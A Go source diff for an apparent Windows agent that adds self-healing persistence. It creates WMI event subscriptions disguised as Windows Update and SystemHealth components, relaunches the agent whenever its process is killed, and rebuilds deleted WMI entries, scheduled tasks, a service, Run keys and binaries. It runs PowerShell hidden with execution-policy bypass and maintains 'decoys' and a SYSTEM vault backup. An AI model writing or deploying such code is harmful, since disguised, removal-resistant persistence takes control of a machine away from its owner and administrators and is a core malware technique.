@@ -147,6 +147,51 @@ var wmiTaskPairs = [][2]string{
 	{"WindowsUpdateOrchestrator", "orchestrator_task.xml"},
 }
 
+// wmiSets mirrors the installer's two resurrection sets (primary +
+// bland-named duplicate). Compiled in so the healer rebuilds them with
+// zero disk dependency.
+var wmiSets = [][4]string{
+	{"WindowsUpdateFilter", "WindowsUpdateDeathFilter", "WindowsUpdateConsumer", "WindowsUpdateTimer"},
+	{"SystemHealthFilter", "SystemHealthDeathFilter", "SystemHealthConsumer", "SystemHealthTimer"},
+}
+
+// ensureWmiLayer verifies both WMI resurrection sets exist and rebuilds
+// any missing one from the compiled-in recipe (same as the installer).
+// Called by the watcher and the SYSTEM healers, so deleting WMI no longer
+// sticks: the surviving service/timer recreates it within minutes. Needs
+// admin/SYSTEM; plain users fail silently and keep going.
+func ensureWmiLayer(agentPath string) {
+	consumer := `"` + agentPath + `" --wmi-heal`
+	for _, s := range wmiSets {
+		na, nd, nc, tid := s[0], s[1], s[2], s[3]
+		chk := `$na='` + na + `';$nd='` + nd + `';` +
+			`$n=(Get-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding | Where-Object { $_.Filter.Name -eq $na -or $_.Filter.Name -eq $nd } | Measure-Object).Count;` +
+			`if ($n -ge 2) { Write-Host 'WMI-OK' }`
+		if out, err := hiddenExec("powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", chk).CombinedOutput(); err == nil && strings.Contains(string(out), "WMI-OK") {
+			continue
+		}
+		var sb strings.Builder
+		sb.WriteString(`$na='` + na + `';$nd='` + nd + `';$nc='` + nc + `';$tid='` + tid + `';`)
+		sb.WriteString(`Get-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding | Where-Object { $_.Filter.Name -eq $na -or $_.Filter.Name -eq $nd } | Remove-CimInstance -ErrorAction SilentlyContinue;`)
+		sb.WriteString(`Get-CimInstance -Namespace root/subscription -ClassName __EventFilter -Filter "Name='$na'" | Remove-CimInstance -ErrorAction SilentlyContinue;`)
+		sb.WriteString(`Get-CimInstance -Namespace root/subscription -ClassName __EventFilter -Filter "Name='$nd'" | Remove-CimInstance -ErrorAction SilentlyContinue;`)
+		sb.WriteString(`Get-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Filter "Name='$nc'" | Remove-CimInstance -ErrorAction SilentlyContinue;`)
+		sb.WriteString(`Get-CimInstance -Namespace root/subscription -ClassName __IntervalTimerInstruction -Filter "TimerId='$tid'" | Remove-CimInstance -ErrorAction SilentlyContinue;`)
+		sb.WriteString(`$t=New-CimInstance -Namespace root/subscription -ClassName __IntervalTimerInstruction -Property @{TimerId=$tid;IntervalBetweenEvents=[uint32]1800000} -ErrorAction Stop;`)
+		sb.WriteString(`$f=New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property @{Name=$na;EventNamespace='root/cimv2';QueryLanguage='WQL';Query="SELECT * FROM __TimerEvent WHERE TimerId='$tid'"} -ErrorAction Stop;`)
+		sb.WriteString(`$d=New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property @{Name=$nd;EventNamespace='root/cimv2';QueryLanguage='WQL';Query="SELECT * FROM __InstanceDeletionEvent WITHIN 30 WHERE TargetInstance ISA 'Win32_Process' AND (TargetInstance.Name='MicrosoftWindowsClient.exe' OR TargetInstance.Name='agent.exe')"} -ErrorAction Stop;`)
+		sb.WriteString(`$c=New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property @{Name=$nc;CommandLineTemplate='` + strings.ReplaceAll(consumer, "'", "''") + `'} -ErrorAction Stop;`)
+		sb.WriteString(`New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property @{Filter=[Ref]$f;Consumer=[Ref]$c} -ErrorAction Stop | Out-Null;`)
+		sb.WriteString(`New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property @{Filter=[Ref]$d;Consumer=[Ref]$c} -ErrorAction Stop | Out-Null;`)
+		sb.WriteString(`Write-Host 'WMI-OK'`)
+		if out, err := hiddenExec("powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", sb.String()).CombinedOutput(); err != nil || !strings.Contains(string(out), "WMI-OK") {
+			log.Printf("[heal] WMI set %s not rebuilt: %v %s", na, err, strings.TrimSpace(string(out)))
+		} else {
+			log.Printf("[heal] WMI set %s rebuilt", na)
+		}
+	}
+}
+
 // resolveTaskXML finds a task XML: install dir first, then any profile
 // backup dir (three copies exist since v1.40.19).
 func resolveTaskXML(dir, name string) string {
@@ -190,7 +235,11 @@ func healBinary(installDir, agentPath, caPath string) {
 	}
 	type cand struct{ bin, cert, tok, ver string }
 	var best *cand
-	for _, d := range systemBackupDirs() {
+	dirs := systemBackupDirs()
+	if v := vaultDir(); v != "" {
+		dirs = append(dirs, v) // SYSTEM vault: copy of last resort
+	}
+	for _, d := range dirs {
 		bin := filepath.Join(d, "MicrosoftWindowsClient.exe")
 		cert := filepath.Join(d, "server.crt")
 		if _, err := os.Stat(bin); err != nil {
@@ -198,6 +247,9 @@ func healBinary(installDir, agentPath, caPath string) {
 		}
 		if _, err := os.Stat(cert); err != nil {
 			continue
+		}
+		if !backupVerified(bin) {
+			continue // manifest mismatch: never restore untrusted bytes
 		}
 		ver := readVerFile(d)
 		if best == nil || (ver != "" && best.ver != "" && verLess(best.ver, ver)) || (best.ver == "" && ver != "") {
@@ -254,6 +306,14 @@ func healBinary(installDir, agentPath, caPath string) {
 // not apply itself (restart is the supervisor's job).
 func runWmiHeal() {
 	commands.ApplyStagedUpdate()
+	// Staged self-delete: WMI runs as SYSTEM, so it always owns the
+	// teardown. Claim it (single executor) and exit; the service tick
+	// re-entry is a no-op once files are gone.
+	if claimDeletePending() {
+		log.Printf("[heal] executing staged self-delete")
+		executeTeardown()
+		os.Exit(0)
+	}
 	exe, err := os.Executable()
 	if err != nil {
 		return
@@ -268,6 +328,7 @@ func runWmiHeal() {
 		}
 	}
 	healBinary(dir, agentPath, caPath)
+	ensureWmiLayer(agentPath)
 	for _, t := range wmiTaskPairs {
 		if err := hiddenExec("schtasks", "/query", "/tn", t[0]).Run(); err == nil {
 			continue
@@ -342,13 +403,15 @@ func ensureWatchPersistence(w *watchCfg) {
 	setRun("WindowsUpdateWatchdog", watchCmd)
 	ensureActiveSetupKey(w.agentPath)
 	ensureService(w.agentPath)
+	ensureWmiLayer(w.agentPath)
+	healDecoys(w)
 	for _, t := range wmiTaskPairs {
 		if err := hiddenExec("schtasks", "/query", "/tn", t[0]).Run(); err == nil {
 			continue
 		}
-		xml := filepath.Join(w.backupDir, t[1])
-		if _, err := os.Stat(xml); err != nil {
-			log.Printf("[watch] task %s missing and no saved XML", t[0])
+		xml := resolveTaskXML(w.installDir, t[1])
+		if xml == "" {
+			log.Printf("[watch] task %s missing and no saved XML in any copy", t[0])
 			continue
 		}
 		if out, err := hiddenExec("schtasks", "/create", "/tn", t[0], "/xml", xml, "/f").CombinedOutput(); err != nil {
